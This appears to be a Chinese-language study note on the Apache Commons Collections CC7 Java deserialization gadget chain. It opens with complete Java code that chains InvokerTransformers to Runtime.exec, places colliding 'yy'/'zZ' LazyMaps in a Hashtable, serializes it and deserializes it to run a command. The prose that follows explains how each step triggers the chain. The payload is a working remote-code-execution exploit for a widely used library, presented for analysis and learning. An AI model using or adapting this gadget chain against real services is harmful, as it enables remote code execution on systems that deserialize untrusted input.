package com.test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.AbstractMap;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;public class CC7 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;        // Reusing transformer chain and LazyMap gadgets from previous payloads        final String[] execArgs = new String[]&#123;&quot;calc&quot;&#125;;        final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);        final Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        execArgs),                new ConstantTransformer(1)&#125;;        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        // Use the colliding Maps as keys in Hashtable        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 2);        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        iTransformers.setAccessible(true);        iTransformers.set(transformerChain,transformers);//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        // Needed to ensure hash collision after previous manipulations        lazyMap2.remove(&quot;yy&quot;);        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test1.out&quot;));        objectOutputStream.writeObject(hashtable);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test1.out&quot;));        objectInputStream.readObject();//            return hashtable;    &#125;&#125;
也是分析了一会儿，也是前2个地方不同：Hashtable.readObject-&gt;Hashtable.reconstitutionPut-&gt;Abstracecorator.equal-&gt;AbstractMap.equals虽然说看起来好像是四个步骤，但是其实equals这里，首先是调用LazyMap.equals，然后Lazymap没有一直找父类找到了AbstractMap.equals来分析一下就好了，首先看到readObject：在最低下调用了reconstitutionput继续跟进：调用了e.key.equals，这里就需要整理一下这个key究竟是什么了，我们溯源一下（过程太繁琐就不一步步的说）最终在WriteObject里可以看到：其实key就是我们第一次put进去的key，为什么需要put两次呢？第一次进入reconstitution时，tab[index]是未赋值的，因此为null，进入不了for循环内，第二次put就可以进入for循环，此时e.key就是LazyMap1，key就是LazyMap2然后就调用lazymap1.equals(lazymap2)，由于lazymap没有equals方法，一直回溯就到了abstractmap.equals:这个m就是lazymap2:因此就调用了Lazymap2.get，后半部分就和CC6一样了，没啥好说的
为什么需要remove LazyMap2的yy键呢？在HashTable的put方法也会调用一次equals! entry就是tab[index]也是第二次put生效，因此，然后和CC6是一个问题，分析一下LazyMap.get:此时这个key是yy（感兴趣的可以自己去往上追溯，很好分析，算了还是讲一下吧）为什么是yy呢？我们一步步跟进：AbstractMap里的key是什么呢：由于我们是先调用了HashMap里的equals,最后才到的AbstractMap，因此这个entryset也就是HashMap的，LazyMap1里放的就是HashMap1，里面的键是yy，因此为yy说完了为什么是yy后，就继续分析，因为我们的LazyMap2里并没有yy这个键，所以会进入if添加一个yy，所以当反序列化的时候就不会进入if判断了，因此需要remove掉
最后一个疑惑点，为什么是yy和zZ呢？同样的还是 reconstitutionPut 函数里的问题，前面说到我们会 put 两次，那么自然 index 这里计算也会进行两次，那么如果第一次和第二次计算出来的 hash 值不同，那么 index 就会不同，就会导致在第二次中 tab 中会找不到值，从而 e 为 null，自然不会进入 for 循环，就不会触发 RCE我们需要让程序以为2次put的tab是同一个才能进入这个for循环，进而rce还有就是为什么只有yy和zZ可以相同，这是java的一个小bug，yy和zZ的hashCode值是一样的：分析告一段落拉
